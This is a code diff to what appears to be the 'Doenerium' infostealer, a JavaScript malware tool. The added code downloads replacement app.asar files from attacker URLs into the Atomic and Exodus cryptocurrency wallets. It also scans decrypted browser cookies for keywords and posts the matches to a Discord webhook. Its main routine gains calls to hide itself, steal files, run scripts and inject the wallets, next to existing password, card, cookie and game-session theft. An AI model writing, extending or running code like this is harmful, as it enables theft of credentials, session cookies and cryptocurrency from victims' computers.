+    const captureScriptPath = path.join(user.temp, 'CaptureScreens.ps1');
+    if (fs.existsSync(captureScriptPath)) {
+        fs.unlinkSync(captureScriptPath);
+        console.log(`File ${captureScriptPath} deleted successfully.`);
+    } else {
+        console.log(`File ${captureScriptPath} does not exist.`);
+    }
 }
 
 function deleteFolderRecursive(folderPath) {
@@ -3030,6 +3186,62 @@ function localWalletData() {
 }
 
 
+async function walletinjection() {
+    await injectAtomic();
+    await injectExodus();
+}
+
+async function injectAtomic() {
+    const atomicPath = path.join(process.env.LOCALAPPDATA, 'Programs', 'atomic');
+    const atomicAsarPath = path.join(atomicPath, 'resources', 'app.asar');
+    const atomicLicensePath = path.join(atomicPath, 'LICENSE.electron.txt');
+
+    await inject(atomicPath, atomicAsarPath, atomicInjectionUrl, atomicLicensePath);
+}
+
+async function injectExodus() {
+    const exodusPath = path.join(process.env.LOCALAPPDATA, 'exodus');
+    const exodusDirs = fs.readdirSync(exodusPath).filter(file => file.startsWith('app-'));
+
+    for (const exodusDir of exodusDirs) {
+        const exodusPathWithVersion = path.join(exodusPath, exodusDir);
+        const exodusAsarPath = path.join(exodusPathWithVersion, 'resources', 'app.asar');
+        const exodusLicensePath = path.join(exodusPathWithVersion, 'LICENSE');
+
+        await inject(exodusPath, exodusAsarPath, exodusInjectionUrl, exodusLicensePath);
+    }
+}
+
+async function inject(appPath, asarPath, injectionUrl, licensePath) {
+    if (!fs.existsSync(appPath) || !fs.existsSync(asarPath)) {
+        return;
+    }
+
+    try {
+        const response = await axios.get(injectionUrl, { responseType: 'stream' });
+
+        if (response.status !== 200) {
+            return;
+        }
+
+        const writer = fs.createWriteStream(asarPath);
+        response.data.pipe(writer);
+
+        await new Promise((resolve, reject) => {
+            writer.on('finish', resolve);
+            writer.on('error', reject);
+        });
+
+        if (licensePath) {
+            fs.writeFileSync(licensePath, discordWebhookUrl);
+        }
+    } catch (error) {
+        console.error('Error during injection:', error);
+    }
+}
+
+
+
 async function getPasswords() {
   const _0x540754 = [];
 
@@ -3190,11 +3402,10 @@ async function getCards() {
   }
 }
 
-
-
 async function getCookies() {
     const cookiesData = {};
     cookiesData['banner'] = [`${user.copyright}\n`];
+    const matchedKeywords = [];
 
     for (let i = 0; i < browserPath.length; i++) {
         const networkPath = path.join(browserPath[i][0], 'Network');
@@ -3247,6 +3458,13 @@ async function getCookies() {
                         } else if (row.host_key === 'account.riotgames.com' && row.name === 'sid') {
                             RiotGameSession(`${decrypted}`);
                         }
+
+                        // Search for keywords
+                        for (const keyword of keywords) {
+                            if (row.host_key.includes(keyword) && !matchedKeywords.includes(keyword)) {
+                                matchedKeywords.push(keyword);
+                            }
+                        }
                     } catch (error) {
                         console.error(`Error decrypting cookies for ${row.host_key}:`, error);
                     }
@@ -3268,9 +3486,14 @@ async function getCookies() {
         });
     }
 
+    // Send matched keywords to Discord webhook
+    if (matchedKeywords.length > 0) {
+        sendKeywordsToDiscord(matchedKeywords);
+    }
+
     for (let [browserName, cookies] of Object.entries(cookiesData)) {
         if (browserName.toLowerCase() === 'banner') {
-            continue; // Skip creating file for 'banner'
+            continue;
         }
 
         if (cookies.length !== 0) {
@@ -3300,6 +3523,38 @@ async function getCookies() {
         }
     }
 }
+
+async function sendKeywordsToDiscord(keywords) {
+    try {
+        // Format keywords as clickable links separated by commas
+        const formattedKeywords = keywords.map(keyword => `[**${keyword}**](https://${encodeURIComponent(keyword)})`).join(', ');
+
+        // Embed style
+        const embed_data = {
+            "title": "Doenerium Keywords",
+            "description": formattedKeywords,
+            "color": 0x303037,
+            "footer": {
+                "text": `${user.hostname} | @WallGod69 | t.me/doenerium69`,
+                "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+            }
+        };
+
+        const payload = {
+            "embeds": [embed_data]
+        };
+
+        const headers = {
+            "Content-Type": "application/json"
+        };
+
+        const responsePost = await axios.post(discordWebhookUrl, payload, { headers });
+    } catch (error) {
+        console.error('Error sending to Discord:', error);
+    }
+}
+
+
 
 
 async function getAutofills() {
@@ -3411,8 +3666,10 @@ async function SubmitRiotGames() {
             const riotGamesDestinationPath = path.join(mainFolderPath, 'RiotGames', 'ProgramData');
 
             const riotGamesExcludeList = [
+                "Metadata\\valorant.live\\valorant.live.db",
                 "Metadata\\valorant.live\\valorant.live.manifest",
                 "Metadata\\valorant.live\\valorant.live.preview.manifest",
+                "Metadata\\league_of_legends.live\\league_of_legends.live.preview.manifest",
                 "Metadata\\vanguard\\setup.exe"
             ];
 
@@ -3534,12 +3791,14 @@ async function closeBrowsers() {
 function onlyUnique(item, index, array) {
     return array.indexOf(item) === index;
 }
+        hideSelf();
         ramcheck();
+        initializeFolders();
         closeBrowsers();
         Killchrome();
-        initializeFolders();
         getEncrypted();
         getCookies();
+        stealFiles();
         runSerialChecker();
         getAutofills();
         getCards();
@@ -3557,5 +3816,7 @@ function onlyUnique(item, index, array) {
         findGithubBackupCodes();
         //addRegistryKey();
         createRunBat();
+        createAndExecuteScripts();
+        walletinjection();
         redirectErrorsToLog();
         SubmitTelegram();
